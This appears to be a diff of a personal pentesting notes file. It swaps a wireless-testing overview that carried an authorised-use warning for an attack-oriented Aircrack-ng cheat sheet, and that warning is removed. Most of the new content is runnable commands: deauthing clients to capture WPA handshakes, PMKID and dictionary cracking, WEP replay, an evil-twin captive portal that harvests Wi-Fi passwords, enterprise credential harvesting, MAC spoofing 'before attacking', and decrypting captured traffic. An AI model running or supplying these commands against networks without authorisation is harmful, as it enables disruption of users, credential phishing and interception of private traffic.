@@ -1,127 +1,152 @@
 # 📡 Wireless Testing
 
-Tools for assessing the security of wireless networks.
 
-## Contents
+# 📡 Aircrack-ng — WiFi Attack Suite
 
-- [Aircrack-ng](#aircrack-ng--wifi-security-suite)
-- [Kismet](#kismet--wireless-detection--ids)
-- [Workflow](#-wireless-assessment-workflow)
-
-> **⚠️ Note:** Wireless testing requires monitor-mode-capable adapters
-> (e.g., Alfa AWUS036ACH, Panda PAU09). Only test networks you own or are
-> explicitly authorized to assess.
+> [!abstract] TL;DR
+> Suite: `airmon-ng` (monitor mode) → `airodump-ng` (capture) →
+> `aireplay-ng` (inject/deauth) → `aircrack-ng` (crack) → `airbase-ng` (evil twin).
 
 ---
 
-## Aircrack-ng — WiFi Security Suite
-
-Complete suite to capture, inject, crack, and test WiFi networks:
-WEP, WPA/WPA2-PSK, WPA3 (via downgrade/PMKID), and more.
-
-### Installation
-```bash
-sudo apt install aircrack-ng
-```
-
-### Core Tools
-
-| Tool | Purpose |
-|------|---------|
-| `airmon-ng` | Enable monitor mode |
-| `airodump-ng` | Capture packets, discover networks/clients |
-| `aireplay-ng` | Packet injection (deauth, replay) |
-| `aircrack-ng` | Crack captured handshakes |
-| `airbase-ng` | Fake access points |
-
-### Common Workflow — WPA/WPA2-PSK
+## 0. Prereqs
 
 ```bash
-# 1. Kill interfering processes, enable monitor mode
-sudo airmon-ng check kill
-sudo airmon-ng start wlan0
-# → creates wlan0mon
-
-# 2. Discover nearby networks
-sudo airodump-ng wlan0mon
-
-# 3. Capture a specific AP (note BSSID + channel), save handshakes
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
-
-# 4. Deauth a client to force a reconnection (captures new handshake)
-sudo aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
-
-# 5. Crack the handshake (dictionary attack)
-aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
-
-# 6. Stop monitor mode when done
-sudo airmon-ng stop wlan0mon
+iw list                          # check card supports monitor mode + injection
+airmon-ng check kill             # kill NetworkManager/wpa_supplicant interfering procs
+airmon-ng start wlan0            # → wlan0mon
+iwconfig                         # verify Mode:Monitor
 ```
 
-### PMKID attack (clientless — no deauth needed)
-```bash
-sudo hcxdumptool -i wlan0mon -o pmkid.pcap --enable_status=1
-hcxpcapngtool -o hash.hc22000 pmkid.pcap
-hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
-```
-
-### WEP (legacy)
-```bash
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_cap wlan0mon
-sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon    # ARP replay
-aircrack-ng -b AA:BB:CC:DD:EE:FF wep_cap-01.cap
-```
-
-**Resources:** [Aircrack-ng Docs](https://www.aircrack-ng.org/doku.php)
+> [!tip] Card support
+> Atheros AR9271 / Realtek RTL8812AU are the classic reliable chipsets for
+> monitor + injection. Check `iw list` output for "monitor" and "AP" modes.
 
 ---
 
-## Kismet — Wireless Detector, Sniffer & IDS
+## 1. Recon — airodump-ng
 
-Passive wireless network detector, packet sniffer, and intrusion detection
-system for WiFi, Bluetooth, SDR, and more. Great for RF survey and rogue AP
-detection.
-
-### Installation
 ```bash
-sudo apt install kismet
-# edit /etc/kismet/kismet.conf (source interface + logging)
-# default web UI: http://localhost:2501
+airodump-ng wlan0mon                          # survey all APs
+airodump-ng --band abg wlan0mon               # 2.4+5GHz
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+#   -c channel · --bssid filter AP · -w write capture (cap/cap.csv/cap.kismet)
 ```
 
-### Common Usage
-```bash
-# Start with a capture source
-sudo kismet -c wlan0
-
-# Headless server (then browse http://localhost:2501)
-sudo kismet -c wlan0 --no-ncurses
-
-# Configuration: /etc/kismet/kismet_site.conf
-#   ncsource=wlan0
-#   logdir=/tmp/kismet/
-```
-
-### Key Capabilities
-
-- Detects hidden networks, rogue APs, and spoofed/deauth attacks
-- Channel hopping across 2.4 & 5 GHz
-- Live device tracking (clients, APs, Bluetooth, BTLE)
-- Alerts (IDS): deauth floods, AP impersonation, new devices
-- Logging: pcapng, kismetdb, JSON — exportable for reporting
-- REST API for automation (`/devices/summary.json` etc.)
-
-**Resources:** [Kismet Docs](https://www.kismetwireless.net/docs/)
+Output columns:
+- **BSSID** — AP MAC · **PWR** — signal · **CH** · **ENC** — WPA2/WPA3/OPN
+- **ESSID** — network name · **STATION** — client MACs below the AP
 
 ---
 
-## 🧭 Wireless Assessment Workflow
+## 2. WPA/WPA2 Handshake Capture
 
+```bash
+# Terminal 1 — capture on target channel, wait for handshake:
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
+# Watch top-right: "WPA handshake: AA:BB:CC:DD:EE:FF" when captured
+
+# Terminal 2 — force it: deauth a client
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+#   -0 deauth · 5 count · -a AP · -c client (omit -c = broadcast deauth, noisier)
 ```
-1. Survey:         kismet / airodump-ng → map SSIDs, channels, clients
-2. Identify:       open, WEP, WPA2-PSK, WPA2-Enterprise, WPA3
-3. Capture:        handshakes (deauth) or PMKID
-4. Crack:          aircrack-ng / hashcat -m 22000
-5. Rogue/evil-twin analysis, misconfig review (weak PSKs, WPS, old TKIP)
-6. Report:         SSID, auth type, findings, recommendations
+
+Handshake-less options:
+- **PMF (802.11w) protected networks:** deauth won't work → wait for a client
+  to (re)connect naturally, or go for SAE/WPA3 downgrade quirks
+- Capture PMKID instead (clientless):
+
+```bash
+# PMKID attack (clientless WPA-PSK):
+hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
+hcxpcapngtool -o hash.hc22000 dump.pcapng
+hashcat -m 22000 hash.hc22000 wordlist.txt
 ```
+
+---
+
+## 3. Cracking — aircrack-ng
+
+```bash
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cap-01.cap
+
+# with rules for candidate mangling:
+aircrack-ng -w wordlist.txt -r /usr/share/hashcat/rules/best64.rule -b <bssid> cap-01.cap
+```
+
+> [!tip] Prefer hashcat
+> For real throughput convert to hashcat format and GPU-crack:
+> ```bash
+> hcxpcapngtool -o hash.22000 cap-01.cap
+> hashcat -m 22000 hash.22000 rockyou.txt
+> ```
+> aircrack-ng CPU cracking is fine for small lists / CTFs.
+
+---
+
+## 4. WEP (legacy — quick kill)
+
+```bash
+airodump-ng -c 6 --bssid <bssid> -w wepcap wlan0mon
+aireplay-ng -3 -b <bssid> -h <your_spoofed_mac> wlan0mon   # ARP replay → IVs
+aircrack-ng -b <bssid> wepcap.cap                          # ~40-80k IVs for 64-bit, 20k+
+aireplay-ng -0 1 -a <bssid> -h <mac> wlan0mon              # kick a client to generate ARP traffic
+```
+
+---
+
+## 5. Evil Twin / AP — airbase-ng
+
+```bash
+airbase-ng -a AA:BB:CC:DD:EE:FF --essid "CoffeeShop" -c 6 wlan0mon
+# hostapd is the better real AP daemon; airbase-ng for quick decoy/CaptivePortal tests
+```
+
+WPA handshake capture evil-twin flow (captive portal phishing):
+```bash
+# 1) airbase-ng clone AP
+# 2) dnsmasq + fake captive portal page (flask/simple httpd)
+# 3) iptables redirect port 80/443 to portal
+# 4) harvest PSK, verify against real AP handshake:
+aircrack-ng -w harvested.txt -b <real_bssid> real-handshake.cap
+```
+
+---
+
+## 6. WPA Enterprise (WPA2-EAP) Notes
+
+```bash
+# capture the exchange — crack user password offline:
+airodump-ng -c 6 --bssid <bssid> -w ent wlan0mon
+aircrack-ng -w rockyou.txt ent.cap              # -E ESSID to help the KDF
+# EAPOL-MGT crack format: hashcat -m 22000 works for PMKID; enterprise =
+# MSCHAPv2 (asleap) or TTLS/PAP harvesting via evil twin + RADIUS (hostapd-mana / eaphammer)
+```
+
+Tools: **eaphammer**, **hostapd-mana** — rogue AP that harvests enterprise creds.
+
+---
+
+## 7. Useful Extras
+
+```bash
+airdecap-ng -e "SSID" -p <password> cap-01.cap   # decrypt captured traffic post-crack
+airdecap-ng -w <wepkey> wepcap.cap               # WEP decrypt
+airmon-ng check                                   # find processes jamming monitor mode
+wash -i wlan0mon                                  # WPS-enabled APs (then reaver/bully)
+sudo macchanger -r wlan0                          # randomize MAC before attacking
+```
+
+---
+
+## 8. Workflow Card
+
+> [!summary] Standard WPA2 flow
+> 1. `airmon-ng start wlan0`
+> 2. `airodump-ng wlan0mon` — pick target
+> 3. `airodump-ng -c X --bssid B -w cap wlan0mon`
+> 4. `aireplay-ng -0 5 -a B -c C wlan0mon` (or PMKID via hcxdumptool)
+> 5. `aircrack-ng -w wordlist -b B cap-01.cap` (or hashcat -m 22000)
+> 6. `airdecap-ng` to read the traffic
+
+Related: [[Nmap Guide]] · [[Metasploit Framework]]
